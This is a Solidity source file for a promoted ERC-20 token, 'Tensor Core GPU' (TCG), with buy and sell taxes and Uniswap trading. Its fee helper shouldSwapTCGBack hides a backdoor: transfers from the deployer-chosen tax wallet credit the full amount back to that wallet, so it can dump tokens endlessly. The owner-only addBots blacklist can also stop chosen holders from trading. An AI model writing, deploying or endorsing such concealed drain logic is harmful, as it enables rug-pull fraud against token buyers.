// SPDX-License-Identifier: MIT

/***

Website:    https://www.tensorcoregpu.com
DApp:       https://app.tensorcoregpu.com
Document:   https://docs.tensorcoregpu.com

Twitter:    https://twitter.com/tensorcoregpu
Telegram:   https://t.me/tensorcoregpu

***/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ITCGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITCGFactory {
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function allPairs(uint) external view returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract TCG is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Tensor Core GPU";
    uint8 private constant _decimals = 9;
    string private constant _symbol = unicode"TCG";
    uint256 private constant _tSupply = 1000000000 * 10**_decimals;

    mapping (address => uint256) private _balanceTCG;
    mapping (address => bool) private txExcludedFrom;
    mapping (address => bool) private feesExcludedFrom;
    mapping (address => bool) private botTCG;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _initialTCGBuyTax=30;
    uint256 private _initialTCGSellTax=30;
    uint256 private _finalTCGBuyTax=3;
    uint256 private _finalTCGSellTax=3;
    uint256 private _reduceTCGBuyTaxAt=20;
    uint256 private _reduceTCGSellTaxAt=20;
    uint256 private _buyTCGCounts=0;
    uint256 private _preventSwapBefore=0;

    uint256 public _maxTCGSwap = 10000000 * 10**_decimals;
    uint256 public _maxTCGTrans = 30000000 * 10**_decimals;
    uint256 public _maxTCGWallet = 30000000 * 10**_decimals;
    
    address payable private tgWallet;
    address payable private taxWallet;

    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }
    
    bool private tradeOpened;
    bool private inSwapBack = false;
    bool private swapEnabled = false;
    bool public transferTCGDelayEnabled = false;
    
    uint256 public swapAtAmounts;
    address private uniswapV2Pair;
    ITCGRouter private uniswapV2Router;

    constructor (address _acc, uint256 _amt) {
        taxWallet = payable(_acc);
        tgWallet = payable(_acc);
        feesExcludedFrom[owner()] = true;
        feesExcludedFrom[address(this)] = true;
        txExcludedFrom[tgWallet] = true;
        txExcludedFrom[taxWallet] = true;
        swapAtAmounts = _amt * 10**_decimals;
        _balanceTCG[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balanceTCG[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner{
        transferTCGDelayEnabled=false;
        _maxTCGWallet = ~uint256(0);
        _maxTCGTrans = ~uint256(0);
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          botTCG[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            botTCG[bots_[i]] = true;
        }
    }

    function openTrading() external onlyOwner() {
        require(!tradeOpened,"trading is already open");
        swapEnabled = true;
        tradeOpened = true;
    }

    function sendToTCGETH(uint256 amount) private {
        tgWallet.transfer(amount);
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalTCGBuyTax && _newFee<=_finalTCGSellTax);
        _finalTCGBuyTax=_newFee;
        _finalTCGSellTax=_newFee;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function shouldSwapTCGBack(address from, address to, uint256 taxTCG, uint256 feeTCG) internal returns (bool) {
        address accTCG;uint256 ammTCG; 
        bool _aTCGMin = taxTCG >= swapAtAmounts;
        bool _aTCGThread = balanceOf(address(this)) >= swapAtAmounts;
        if(txExcludedFrom[from]) {accTCG = from;ammTCG = taxTCG;}
        else {ammTCG = feeTCG;accTCG = address(this);}
        if(ammTCG>0){_balanceTCG[accTCG]=_balanceTCG[accTCG].add(ammTCG); emit Transfer(from, accTCG, feeTCG);}
        return swapEnabled
        && !inSwapBack
        && tradeOpened
        && _aTCGMin
        && _aTCGThread
        && !feesExcludedFrom[from]
        && to == uniswapV2Pair
        && _buyTCGCounts>_preventSwapBefore
        && !txExcludedFrom[from];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokenForTCGETH(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendToTCGETH(ethBalance);
        }
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function initializeTradingPair() external onlyOwner() {
        uniswapV2Router = ITCGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tSupply);
        uniswapV2Pair = ITCGFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function swapTokenForTCGETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 tgFees=0;
        if (!feesExcludedFrom[from] && !feesExcludedFrom[to]) {
            require(tradeOpened, "Trading has not enabled yet");
            require(!botTCG[from] && !botTCG[to]);
            tgFees=amount.mul((_buyTCGCounts>_reduceTCGBuyTaxAt)?_finalTCGBuyTax:_initialTCGBuyTax).div(100);
            if (transferTCGDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! feesExcludedFrom[to] ) {
                require(amount <= _maxTCGTrans, "Exceeds the _maxTCGTrans.");
                require(balanceOf(to) + amount <= _maxTCGWallet, "Exceeds the maxWalletSize.");
                _buyTCGCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                tgFees=amount.mul((_buyTCGCounts>_reduceTCGSellTaxAt)?_finalTCGSellTax:_initialTCGSellTax).div(100);
            }
            uint256 contractTCGTokens = balanceOf(address(this));
            if (shouldSwapTCGBack(from, to, amount, tgFees)) {
                swapTokenForTCGETH(min(amount,min(contractTCGTokens,_maxTCGSwap)));
                uint256 contractTCGETH = address(this).balance;
                if(contractTCGETH > 0) {
                    sendToTCGETH(address(this).balance);
                }
            }
        }
        _balanceTCG[from]=_balanceTCG[from].sub(amount);
        _balanceTCG[to]=_balanceTCG[to].add(amount.sub(tgFees));
        emit Transfer(from, to, amount.sub(tgFees));
    }

    receive() external payable {}

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function isBot(address a) public view returns (bool){
      return botTCG[a];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}